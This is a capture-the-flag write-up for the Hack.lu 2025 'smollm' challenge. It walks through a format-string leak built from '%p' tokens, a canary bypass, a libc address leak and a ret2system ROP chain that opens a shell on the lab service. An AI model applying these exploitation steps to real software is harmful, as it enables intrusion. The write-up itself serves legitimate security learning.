# Smollm - Hack.lu 2025

## Introduction

This challenge is a pseudo AI assistant.

```sh
$ nc SMOLLM.flu.xxx 1024
Hello, and welcome to smøllm. Your friendly AI assistant.
You can add you own custom tokens or run a prompt.
Do you want to
1) Add a custom token
2) Run a prompt
>
```

The source code I provided, and here is the sec that seemed to be present on the binary.

```bash
$ checksec smollm
[*] '/home/dajaaj/personal/hacklu2025/smollm/smollm'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Adding a token (8 bytes) will put it at the end of a pre-defined list of words.

```sh
Do you want to
1) Add a custom token
2) Run a prompt
>1
token?>tonio
```

```c
void add_token(const char* token, int len) {
    if (n_tokens == 256) {
        printf("Max number of tokens reached!\n");
        return;
    }
    memcpy(tokens[n_tokens], token, len);
    memset(tokens[n_tokens++] + len, ' ', TOKEN_SIZE - len);
}
```

Whereas running the prompt will ask for some input and print random words based on that.

```sh
Do you want to
1) Add a custom token
2) Run a prompt
>2
How can I help you?
>Hi?
tell    tonio
  plfanzencould
```

## Vulnerabilities

We can se two main vulnerabilities in the code which are both in the `run_prompt` function.

This function simulate the AI assistant.

```c
void run_prompt() {
    int n;
    static unsigned int combinator = 0;
    char in_buf[256], out_buf[256];
    bzero(in_buf, sizeof(in_buf));
    bzero(out_buf, sizeof(in_buf));

    printf("How can I help you?\n>");
    n = read(STDIN_FILENO, in_buf, sizeof(in_buf));
    if (n <= 0) {
        printf("Read error\n");
        exit(-1);
    }
    for (int i = 0; i < n; i++) {
        memcpy(&out_buf[i*TOKEN_SIZE], tokens[(in_buf[i] + combinator++) % n_tokens], TOKEN_SIZE);
    }

    printf(out_buf);
    printf("\n");
}
```

### Format String

At the end of the function we can see that the `out_buf` will be printed as a format string, so we can use it to leak the stack.

### Stack based buffer overflow

The memcpy will write after the `out_buf` after `i=32`, cause its size is `256`. \
`32*TOKEN_SIZE = 32*8 = 256`.

With this finds we can read and control the stack !

## Exploitation

As `ASLR` is enabled we'll need to first leak some addresses on the stack to then construct a ROP chain (`NX` is enabled).

But first we need to understand the words selection logic.

### Logic

Above is the code that choose the 8 bytes word to write to `out_buf` baised on our input.

```c
memcpy(&out_buf[i*TOKEN_SIZE], tokens[(in_buf[i] + combinator++) % n_tokens], TOKEN_SIZE);
```

So if we want the token we added to be printed we need to use the following formula: `token_index - i - combinator`.

### Stack leak

To leak the stack we can add the following token: `%p%p%p%p`, and print it.

```sh
Do you want to
1) Add a custom token
2) Run a prompt
>1
token?>%p%p%p%p
Do you want to
1) Add a custom token
2) Run a prompt
>Invalid choice
Do you want to
1) Add a custom token
2) Run a prompt
>2
How can I help you?
>j
0x10x20x10x5711695493c0can
```

Here we leak !

We can see an "invalide choice" message, as `add_token` only reads 8 bytes, the `\n` will be red after.

Now let's try to print our token 32 time:
```sh
Do you want to
1) Add a custom token
2) Run a prompt
>2
How can I help you?
>jihgfedcba`_^]\[ZYXWVUTSRQPONMLK
0x200x210x200x6248b7acb3c00x636465666768696a0x5b5c5d5e5f6061620x535455565758595a0x4b4c4d4e4f5051520xa(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x20202020776f6e6b0x141d53f320319c000x7fff3701ce6f0x6248b7ac8474(nil)0x32000000000000000x7025702570250a0x141d53f320319c00(nil)0x7fff3701cfc80x7fff3701cf400x1(nil)0x7a862a7211ca0x7fff3701cef00x7fff3701cfc80x1b7ac60400x6248b7ac83890x7fff3701cfc80xe36d61cfae476dae0x1(nil)0x6248b7acad900x7a862a9430000xe36d61cfada76dae0xe99f5b2813c56dae0x7fff00000000(nil)(nil)0x10x7fff3701cfc00x141d53f320319c000x7fff3701cfa00x7a862a72128b0x7fff3701cfd80x6248b7acad900x7fff3701cfd80x6248b7ac8389(nil)(nil)0x6248b7ac80400x7fff3701cfc0(nil)(nil)(nil)0x6248b7ac80650x7fff3701cfb80x380x10x7fff3701dfc8(nil)0x7fff3701dfd9(nil)0x210x7fff371530000x330xd300x100x178bfbff0x6know
```

Here because of the `\n`, we already write out of the buffer.

All the `0x7025702570257025` are our `%p`.

### Stack overwrite

If we try to print 33 time our token:

```sh
*** stack smashing detected ***: terminated
```

We hit the canary... But we leaked it earlier ! So we just have to do a first leak from a first run_prompt and then overwrite the canay with the value we got from the leak.

The stack like that:

`[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ return address][ ??? ]`

### ROP

As we control the return address, we might be able to do a ROP ! But with **PIE** and **ASLR** on it seems complicated :/

Fortunatly an address of the libc is present in the stack's leak (0x7a862a7211ca in the leak above).

`[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ return address ][ ??? ][ ... ][ libc address ]`

And **system** and **/bin/sh** are present in the provided libc :)

So we can create a shell !

We will overwrite the stack to get something like that:

`[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ pop rdi ][ /bin/sh ][ system ]`

There is a last problem which I figure out but looking at `/tmp/core.smollm.<pid>` file, when a program crashes it creates this file which you can analyse in gdb.
And I saw the following error.

```
0x7f753b65843b    movaps xmmword ptr [rsp + 0x50], xmm0     <[0x7ffd8e1025e8] not aligned to 16 bytes>
```

After looking at [some blog post](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment) I figure out that adding a ret gadget would do the job.

`[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ pop rdi ][ /bin/sh ][ ret ][ system ]`

Tada !!

```sh
$ cat flag
flag{w3_4re_ou7_0f_7ok3n5,sorry:171cec579a6ccf7ab7eba1b8cd2ee12c}
```

Feel free to read my script, even if its a bit messy Xd.
